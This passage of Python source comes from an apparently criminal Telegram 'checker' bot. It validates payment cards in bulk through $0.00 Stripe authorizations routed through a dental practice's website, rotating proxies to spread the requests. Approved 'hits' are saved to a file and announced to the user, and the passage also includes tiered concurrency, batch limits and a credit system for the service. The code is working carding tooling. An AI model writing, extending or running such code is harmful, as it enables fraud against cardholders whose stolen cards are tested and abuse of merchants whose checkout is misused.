    """Mass check logic for Stripe Auth V2 gateway"""
    u_id = update.effective_user.id
    message = update.effective_message
    total = len(cards)
    
    print(f"\n{'='*80}")
    print(f"🚀 [STRIPE AUTH V2 MASS CHECK] Starting batch for user {u_id}")
    print(f"📊 Total cards: {total}")
    print(f"{'='*80}")
    
    stats = {
        "approved": 0,
        "declined": 0,
        "errors": 0,
        "total": total,
        "processed": 0
    }
    
    start_time = time.time()
    
    try:
        # Add to active tasks
        if 'stripe_auth_v2_active_tasks' not in globals():
            global stripe_auth_v2_active_tasks
            stripe_auth_v2_active_tasks = {}
        stripe_auth_v2_active_tasks[u_id] = True
        
        tier = user_manager.get_tier(u_id)
        
        # Concurrency based on tier
        CONCURRENCY = {
            "free": 2,
            "premium": 5,
            "ultimate": 10,
            "admin": 15,
        }.get(tier, 2)
        
        # Create initial progress message
        if progress_msg is None:
            approved_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
            dead_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
            errors_emoji = premium_emoji(PREMIUM_EMOJI_IDS["error"], "⚠️")
            
            initial_text = (
                f"<b>Gateway</b> ➛ Stripe Auth V2\n"
                f"<b>Status</b> ➛ STARTING... \n"
                f"<b>Checked</b> ➛ 0/{total} \n"
                f"<b>Approved</b> ➛ 0 {approved_emoji} \n"
                f"<b>Dead</b> ➛ 0 {dead_emoji} \n"
                f"<b>Errors</b> ➛ 0 {errors_emoji}\n"
                f"<b>Time</b> ➛ 0s"
            )
            
            progress_msg = await message.reply_text(
                initial_text,
                parse_mode=ParseMode.HTML
            )
        
        semaphore = asyncio.Semaphore(CONCURRENCY)
        results_lock = asyncio.Lock()
        processed = 0
        
        async def process_card(card: str, idx: int):
            nonlocal processed
            async with semaphore:
                # Get proxy if allowed
                proxy_str = None
                if user_manager.can_use_proxy(u_id):
                    if u_id in autosopi_proxy_tracker.working_proxies and autosopi_proxy_tracker.working_proxies[u_id]:
                        proxy_list = autosopi_proxy_tracker.working_proxies[u_id]
                        if proxy_list:
                            proxy_index = idx % len(proxy_list)
                            proxy_str = proxy_list[proxy_index]
                
                # Process card
                result = await check_card_stripe_auth_v2(card, proxy_str)
                
                # Get BIN info
                bin_info = await get_bin_info(card, u_id)
                
                async with results_lock:
                    processed += 1
                    
                    status_category = result.get("status_category", "unknown")
                    
                    if status_category == "approved":
                        stats["approved"] += 1
                    elif status_category == "declined":
                        stats["declined"] += 1
                    else:
                        stats["errors"] += 1
                    
                    # Send result for approved cards
                    if status_category == "approved":
                        ui, _ = format_stripe_auth_v2_response(result, card, bin_info)
                        try:
                            await message.reply_text(ui, parse_mode=ParseMode.HTML)
                        except Exception as e:
                            print(f"❌ Error sending result: {e}")
                        
                        # Save hit to file
                        await save_hit_to_file(
                            card=card,
                            gateway="Stripe Auth V2",
                            response=result.get("message", "Approved"),
                            price="$0.00",
                            bin_info=bin_info,
                            user_id=u_id,
                            user_tier=tier
                        )
                        
                        # Send notification
                        user_data = user_manager.get_user(u_id)
                        await send_hit_notification(
                            context=context,
                            gateway="Stripe Auth",
                            card=card,
                            response=result.get("message", "Approved"),
                            price="$0.00",
                            user=user_data,
                            bin_info=bin_info,
                            status_category="approved"
                        )
                        user_manager.increment_hits(u_id)
                    
                    user_manager.increment_checks(u_id, 1)
                    
                    # Update progress every 10 cards
                    if processed % 10 == 0 or processed == total:
                        elapsed = int(time.time() - start_time)
                        minutes = elapsed // 60
                        seconds = elapsed % 60
                        time_str = f"{minutes}m {seconds}s" if minutes > 0 else f"{seconds}s"
                        
                        approved_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
                        dead_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
                        errors_emoji = premium_emoji(PREMIUM_EMOJI_IDS["error"], "⚠️")
                        
                        progress_text = (
                            f"<b>Gateway</b> ➛ Stripe Auth V2\n"
                            f"<b>Status</b> ➛ PROCESSING {processed}/{total}\n"
                            f"<b>Checked</b> ➛ {processed}/{total}\n"
                            f"<b>Approved</b> ➛ {stats['approved']} {approved_emoji}\n"
                            f"<b>Dead</b> ➛ {stats['declined']} {dead_emoji}\n"
                            f"<b>Errors</b> ➛ {stats['errors']} {errors_emoji}\n"
                            f"<b>Time</b> ➛ {time_str}"
                        )
                        
                        try:
                            await progress_msg.edit_text(progress_text, parse_mode=ParseMode.HTML)
                        except Exception as e:
                            print(f"⚠️ Progress update error: {e}")
                
                return result, card
        
        # Process all cards
        tasks = [process_card(card, idx) for idx, card in enumerate(cards)]
        
        for coro in asyncio.as_completed(tasks):
            if u_id not in stripe_auth_v2_active_tasks:
                break
            try:
                await coro
            except Exception as e:
                print(f"❌ Task error: {e}")
                async with results_lock:
                    stats["errors"] += 1
                    stats["processed"] += 1
        
        # Final summary
        if u_id in stripe_auth_v2_active_tasks:
            total_time = time.time() - start_time
            minutes = int(total_time // 60)
            seconds = int(total_time % 60)
            
            approved_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
            declined_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
            errors_emoji = premium_emoji(PREMIUM_EMOJI_IDS["error"], "⚠️")
            total_emoji = premium_emoji(PREMIUM_EMOJI_IDS["stats"], "📝")
            time_emoji = premium_emoji(PREMIUM_EMOJI_IDS["time"], "⏱️")
            skull_emoji = premium_emoji(PREMIUM_EMOJI_IDS["skull"], "💀")
            
            summary = (
                f"{skull_emoji} <b>Stripe Auth V2 Mass Check Complete</b>\n\n"
                f"{approved_emoji} <b>Approved</b> ➛ {stats['approved']}\n"
                f"{declined_emoji} <b>Declined</b> ➛ {stats['declined']}\n"
                f"{errors_emoji} <b>Errors</b> ➛ {stats['errors']}\n"
                f"{total_emoji} <b>Total</b> ➛ {total}\n"
                f"{time_emoji} <b>Time</b> ➛ {minutes}m {seconds}s\n"
                f"{skull_emoji} <b>Bot</b> ➛ @BLADESARKS_V3bot"
            )
            
            # Update final progress
            final_approved_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
            final_dead_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
            final_errors_emoji = premium_emoji(PREMIUM_EMOJI_IDS["error"], "⚠️")
            
            final_progress = (
                f"<b>Gateway</b> ➛ Stripe Auth V2\n"
                f"<b>Status</b> ➛ FINISHED ✅\n"
                f"<b>Checked</b> ➛ {total}/{total}\n"
                f"<b>Approved</b> ➛ {stats['approved']} {final_approved_emoji}\n"
                f"<b>Declined</b> ➛ {stats['declined']} {final_dead_emoji}\n"
                f"<b>Errors</b> ➛ {stats['errors']} {final_errors_emoji}\n"
                f"<b>Time</b> ➛ {minutes}m {seconds}s"
            )
            
            try:
                await progress_msg.edit_text(final_progress, parse_mode=ParseMode.HTML)
                await message.reply_text(summary, parse_mode=ParseMode.HTML)
            except Exception as e:
                print(f"❌ Error sending final summary: {e}")
        
        return stats
        
    except Exception as e:
        print(f"❌ Mass check error: {e}")
        traceback.print_exc()
        try:
            error_emoji = premium_emoji(PREMIUM_EMOJI_IDS["error"], "❌")
            await progress_msg.edit_text(
                f"{error_emoji} <b>Error:</b> {str(e)[:100]}",
                parse_mode=ParseMode.HTML
            )
        except:
            pass
    finally:
        stripe_auth_v2_active_tasks.pop(u_id, None)
        print(f"🏁 [Stripe Auth V2] Session ended for user {u_id}")


# ============ MASS CHECK WRAPPER FOR STRIPE AUTH V2 ============
async def mass_check_stripe_auth_v2(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass card check with Stripe Auth V2 gateway - /mchk1 <cards>"""
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    message = update.effective_message
    
    # Check if user can mass check
    if not user_manager.can_mass_check(user_id):
        tier = user_manager.get_tier(user_id)
        await message.reply_text(
            f"❌ <b>Mass Check Not Available for {tier.upper()} Tier</b>\n\n"
            f"Use <code>/chk1 &lt;card&gt;</code> for single checks.\n\n"
            f"💎 Upgrade to Premium/Ultimate for mass checks.",
            parse_mode=ParseMode.HTML
        )
        return
    
    if not context.args:
        await message.reply_text(
            "📦 <b>Stripe Auth V2 Mass Check</b>\n\n"
            "Usage: <code>/mchk1 &lt;card1&gt; &lt;card2&gt; ...</code>\n\n"
            "Examples:\n"
            "<code>/mchk1 4242424242424242|12|2028|123 4000000000000002|12|2028|123</code>\n\n"
            "💰 Amount: $0.00 (Authorization only)\n"
            "📍 Gateway: Stripe Auth via marinadentistry.com\n"
            "📊 Only approved cards will be shown",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Extract cards
    cards_text = " ".join(context.args)
    card_strings = cards_text.split()
    
    cards = []
    invalid_cards = []
    
    for card_str in card_strings:
        card = card_formatter.extract_single_card_from_text(card_str)
        if card:
            cards.append(card)
        else:
            invalid_cards.append(card_str[:30])
    
    if invalid_cards:
        await message.reply_text(
            f"⚠️ Found {len(invalid_cards)} invalid card(s). They will be skipped.\n"
            f"First invalid: {invalid_cards[0]}..."
        )
    
    if not cards:
        await message.reply_text("❌ No valid cards found.")
        return
    
    # Check batch size limit
    max_batch = user_manager.get_max_batch_size(user_id)
    if len(cards) > max_batch:
        await message.reply_text(f"⚠️ Your tier allows max {max_batch} cards. Truncating to {max_batch}.")
        cards = cards[:max_batch]
    
    # Check credits for mass check (1 credit per card for free users)
    can_proceed, error_msg = await check_and_deduct_mass_credits(user_id, update, context, len(cards))
    if not can_proceed:
        await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
        return
    
    # Delete command message
    try:
        await message.delete()
    except:
        pass
    
    # Start mass check
    await stripe_auth_v2_mass_check_logic(update, context, cards)
        
# ============ CREDIT SYSTEM (FREE USERS ONLY) ============
CREDITS_FILE = "user_credits.json"
INITIAL_FREE_CREDITS = 250
CREDITS_PER_CHECK = 1  # 1 credit = 1 card check (only for free users)

# Store user credits
user_credits = {}  # user_id -> credits remaining
user_credits_loaded = False

def load_user_credits():
    """Load user credits from file"""
    global user_credits, user_credits_loaded
    if Path(CREDITS_FILE).exists():
        try:
            with open(CREDITS_FILE, 'r') as f:
                user_credits = json.load(f)
                # Convert string keys to int
                user_credits = {int(k): v for k, v in user_credits.items()}
            print(f"📊 Loaded credits for {len(user_credits)} users")
        except Exception as e:
            print(f"⚠️ Error loading credits: {e}")
            user_credits = {}
    else:
        user_credits = {}
    user_credits_loaded = True

def save_user_credits():
    """Save user credits to file"""
    try:
        with open(CREDITS_FILE, 'w') as f:
            json.dump(user_credits, f, indent=2)
    except Exception as e:
        print(f"⚠️ Error saving credits: {e}")

def get_user_credits(user_id: int) -> int:
    """Get remaining credits for a user"""
    if not user_credits_loaded:
        load_user_credits()
    return user_credits.get(user_id, 0)

def add_user_credits(user_id: int, amount: int) -> int:
    """Add credits to a user and return new total"""
    current = get_user_credits(user_id)
    new_total = current + amount
    user_credits[user_id] = new_total
    save_user_credits()
    return new_total

def deduct_user_credits(user_id: int, amount: int = CREDITS_PER_CHECK) -> bool:
    """Deduct credits for a check, return True if successful"""
    current = get_user_credits(user_id)
    if current >= amount:
        user_credits[user_id] = current - amount
        save_user_credits()
        return True
    return False

def initialize_new_user_credits(user_id: int) -> int:
    """Give initial free credits to new user (only for free tier)"""
    # Only give credits if user doesn't have any credits yet
    if user_id not in user_credits:
        user_credits[user_id] = INITIAL_FREE_CREDITS
        save_user_credits()
        print(f"🎉 New free user {user_id} received {INITIAL_FREE_CREDITS} free credits!")
        return INITIAL_FREE_CREDITS
    return user_credits[user_id]

def reset_user_credits(user_id: int) -> bool:
    """Reset user credits to initial amount (admin only)"""
    user_credits[user_id] = INITIAL_FREE_CREDITS
    save_user_credits()
    return True

